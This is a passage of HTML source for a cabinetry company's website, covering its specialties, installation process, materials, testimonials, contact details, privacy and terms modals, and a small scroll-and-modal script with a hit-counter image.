                <div class="timeline-year-rst012">2018</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Modern Excellence</h3>
                    <p>Integrated smart storage solutions and contemporary design elements while preserving traditional craftsmanship values. Established partnerships with leading hardware manufacturers for enhanced functionality.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="specialties" class="specialty-section-tuv456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Specialties</h2>
            <div class="specialty-grid-wxy789">
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1571468/pexels-photo-1571468.jpeg" alt="Dovetail Joints" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Dovetail Joinery</h3>
                    <p class="service-description-wxy901">Traditional dovetail joints provide superior strength and durability. Our craftsmen hand-cut each joint for perfect fit and lasting performance in drawer construction.</p>
                </div>
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1080696/pexels-photo-1080696.jpeg" alt="Custom Hardware" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Hardware Integration</h3>
                    <p class="service-description-wxy901">Specialized installation of soft-close mechanisms, pull-out shelves, and organizational systems. Each component is carefully selected for optimal functionality and longevity.</p>
                </div>
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1571453/pexels-photo-1571453.jpeg" alt="Finishing Techniques" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Finishing Excellence</h3>
                    <p class="service-description-wxy901">Multi-stage finishing process ensures smooth, durable surfaces resistant to moisture, scratches, and daily wear. Available in numerous stain and paint options.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="process" class="process-section-fgh678">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Installation Process</h2>
            <div class="process-steps-ijk901">
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">1</div>
                    <h3 class="service-title-tuv678">Initial Consultation</h3>
                    <p class="service-description-wxy901">Comprehensive assessment of your space, needs, and design preferences. We discuss material options, functionality requirements, and project timeline during this detailed planning phase.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">2</div>
                    <h3 class="service-title-tuv678">Design Development</h3>
                    <p class="service-description-wxy901">Creation of detailed plans and 3D renderings showing your custom cabinetry. Multiple revisions ensure the design perfectly matches your vision and space requirements.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">3</div>
                    <h3 class="service-title-tuv678">Precision Manufacturing</h3>
                    <p class="service-description-wxy901">Expert craftsmen build your cabinets using selected materials and proven techniques. Quality control checks at each stage ensure exceptional standards are maintained throughout production.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">4</div>
                    <h3 class="service-title-tuv678">Professional Installation</h3>
                    <p class="service-description-wxy901">Skilled installation team ensures perfect fit and finish. <span class="continue-link-abc789" onclick="scrollToSection('reviews')">Click here to continue</span> reading what our satisfied customers say about our installation quality.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="materials" class="materials-section-rst890">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Quality Materials We Use</h2>
            <div class="materials-grid-uvw123">
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Solid Hardwoods</h3>
                    <p class="service-description-wxy901">Oak, maple, cherry, and walnut sourced from sustainable forests. Each piece is carefully selected for grain pattern and structural integrity.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Engineered Panels</h3>
                    <p class="service-description-wxy901">High-quality plywood and MDF cores with hardwood veneers. Provides stability and resistance to warping in various environmental conditions.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Hardware Components</h3>
                    <p class="service-description-wxy901">European-style hinges, drawer slides, and organizational accessories from trusted manufacturers. All hardware includes lifetime adjustment warranties.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Finishing Products</h3>
                    <p class="service-description-wxy901">Low-VOC stains, paints, and protective coatings. Environmentally responsible products that maintain indoor air quality while providing excellent durability.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews-section-abc901">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Customer Testimonials</h2>
            <div class="reviews-grid-def234">
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"The kitchen cabinets exceeded our expectations. The craftsmanship is outstanding and the installation was completed ahead of schedule. Every detail was handled with professional care and attention."</p>
                    <p class="reviewer-name-mno123">- Sarah Mitchell, Homeowner</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"LumvexHub transformed our bathroom with beautiful vanity cabinets. The moisture-resistant finish has held up perfectly after two years. Highly recommend their expertise and reliability."</p>
                    <p class="reviewer-name-mno123">- Robert Chen, Property Manager</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"Custom pantry storage solved our organization challenges completely. The pull-out shelves and adjustable compartments make everything easily accessible. Quality workmanship throughout."</p>
                    <p class="reviewer-name-mno123">- Jennifer Rodriguez, Interior Designer</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"Professional service from consultation through final installation. The team listened to our needs and delivered exactly what we envisioned. <span class="continue-link-abc789" onclick="scrollToSection('contact')">Click here to continue</span> and contact them for your project."</p>
                    <p class="reviewer-name-mno123">- Michael Thompson, Contractor</p>
                </div>
            </div>
        </div>
    </section>

    <section id="contact" class="contact-section-pqr456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Contact Information</h2>
            <div class="contact-info-stu789">
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Phone</h3>
                    <a href="tel:+15552847391" class="phone-link-bcd678">(555) 284-7391</a>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Email</h3>
                    <p>info@lumvexhub.com</p>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Address</h3>
                    <p>2847 Craftsman Boulevard<br>Woodville, TX 75990</p>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Business Hours</h3>
                    <p>Monday - Friday: 7:00 AM - 6:00 PM<br>Saturday: 8:00 AM - 4:00 PM<br>Sunday: Closed</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Privacy Policy Modal -->
    <div id="privacy-modal" class="modal-overlay-efg901">
        <div class="modal-content-hij234">
            <span class="modal-close-klm567" onclick="hideModal('privacy')">&times;</span>
            <h2 class="modal-title-nop890">Privacy Policy</h2>
            <div class="modal-text-qrs123">
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Information Collection</h3>
                <p>LumvexHub collects information you provide directly, such as when you request consultations, submit project inquiries, or communicate with our team. This may include your name, contact information, project details, and preferences.</p>
                
                <h3>Information Usage</h3>
                <p>We use collected information to provide cabinetry services, respond to inquiries, schedule consultations, and communicate project updates. Your information helps us deliver personalized service and maintain project records.</p>
                
                <h3>Information Sharing</h3>
                <p>We do not sell, trade, or rent your personal information to third parties. Information may be shared with trusted service providers who assist in business operations, subject to confidentiality agreements.</p>
                
                <h3>Data Security</h3>
                <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction. However, no internet transmission is completely secure.</p>
                
                <h3>Contact Information</h3>
                <p>For privacy-related questions or concerns, contact us at info@lumvexhub.com or (555) 284-7391. We will respond to privacy inquiries within reasonable timeframes.</p>
                
                <h3>Policy Updates</h3>
                <p>This privacy policy may be updated periodically. Continued use of our services after changes indicates acceptance of updated terms. Material changes will be communicated through appropriate channels.</p>
            </div>
        </div>
    </div>

    <!-- Terms of Service Modal -->
    <div id="terms-modal" class="modal-overlay-efg901">
        <div class="modal-content-hij234">
            <span class="modal-close-klm567" onclick="hideModal('terms')">&times;</span>
            <h2 class="modal-title-nop890">Terms of Service</h2>
            <div class="modal-text-qrs123">
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Service Agreement</h3>
                <p>By engaging LumvexHub for cabinetry services, you agree to these terms and conditions. Services include consultation, design, manufacturing, and installation of custom cabinetry solutions.</p>
                
                <h3>Project Scope</h3>
                <p>Each project begins with detailed consultation to establish scope, materials, timeline, and specifications. Changes to approved plans may affect project cost and completion schedule.</p>
                
                <h3>Payment Terms</h3>
                <p>Payment schedules are established per project agreement. Deposits may be required to begin work. Final payment is due upon project completion and customer acceptance.</p>
                
                <h3>Warranties</h3>
                <p>We provide warranties on workmanship and materials as specified in individual project agreements. Warranty terms vary based on materials used and installation conditions.</p>
                
                <h3>Limitation of Liability</h3>
                <p>Our liability is limited to the value of services provided. We are not responsible for indirect, consequential, or incidental damages arising from service provision.</p>
                
                <h3>Dispute Resolution</h3>
                <p>Disputes will be resolved through good faith negotiation. If resolution cannot be reached, binding arbitration may be required as specified in project agreements.</p>
                
                <h3>Governing Law</h3>
                <p>These terms are governed by Texas state law. Any legal proceedings will be conducted in appropriate Texas courts with jurisdiction over our business location.</p>
            </div>
        </div>
    </div>

    <script>
        function showModal(type) {
            document.getElementById(type + '-modal').style.display = 'block';
        }

        function hideModal(type) {
            document.getElementById(type + '-modal').style.display = 'none';
        }

        function scrollToSection(sectionId) {
            document.getElementById(sectionId).scrollIntoView({
                behavior: 'smooth'
            });
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target.classList.contains('modal-overlay-efg901')) {
                event.target.style.display = 'none';
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('.nav-link-mno345').forEach(link => {
            link.addEventListener('click', function(e) {
                if (this.getAttribute('href').startsWith('#')) {
                    e.preventDefault();
                    const targetId = this.getAttribute('href').substring(1);
                    const targetElement = document.getElementById(targetId);
                    if (targetElement) {
                        targetElement.scrollIntoView({
                            behavior: 'smooth'
                        });
                    }
                }
            });
        });
    </script>

<a href="/" alt="cool hit counter" target="_blank" >
<img  src="//sstatic1.histats.com/0.gif?4977143&101" alt="cool hit counter" border="0">
    
</body>
</html>



